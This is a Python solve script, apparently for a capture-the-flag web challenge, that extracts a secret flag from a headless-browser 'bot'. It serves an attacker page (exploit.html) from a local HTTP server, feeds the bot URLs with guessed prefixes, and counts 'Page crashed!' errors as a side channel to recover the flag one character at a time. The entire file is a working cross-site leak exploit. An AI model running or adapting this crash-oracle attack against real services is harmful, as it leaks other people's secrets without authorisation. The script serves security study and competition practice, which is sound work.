#!/usr/bin/env python3

import socket
import string
import threading
from functools import partial
from http.server import SimpleHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from urllib.parse import quote


BOT = ("127.0.0.1", 1337)
ATTACKER = "http://host.docker.internal:8000/exploit.html"
ALPHABET = "}_" + string.ascii_letters + string.digits


def ask_bot(prefix, candidates):
    url = f"{ATTACKER}?prefix={quote(prefix)}&candidates={quote(candidates)}"

    with socket.create_connection(BOT) as connection:
        connection.sendall((url + "\n").encode())
        output = ""
        while data := connection.recv(4096):
            output += data.decode(errors="replace")

    crashes = output.count("Error: Page crashed!")
    # Each add tab redirects to the default list and crashes on its own note.
    expected = 2 * len(candidates)
    assert crashes in (expected - 1, expected)
    return crashes == expected - 1


server = ThreadingHTTPServer(
    ("0.0.0.0", 8000),
    partial(SimpleHTTPRequestHandler, directory=Path(__file__).parent),
)
threading.Thread(target=server.serve_forever, daemon=True).start()

flag = "ECSC{"
print(flag)

try:
    while not flag.endswith("}"):
        for offset in range(0, len(ALPHABET), 2):
            candidates = ALPHABET[offset : offset + 2]
            if ask_bot(flag, candidates):
                char = candidates[0]
                if len(candidates) == 2 and not ask_bot(flag, char):
                    char = candidates[1]
                flag += char
                print(flag)
                break
finally:
    server.shutdown()

print("Flag:", flag)
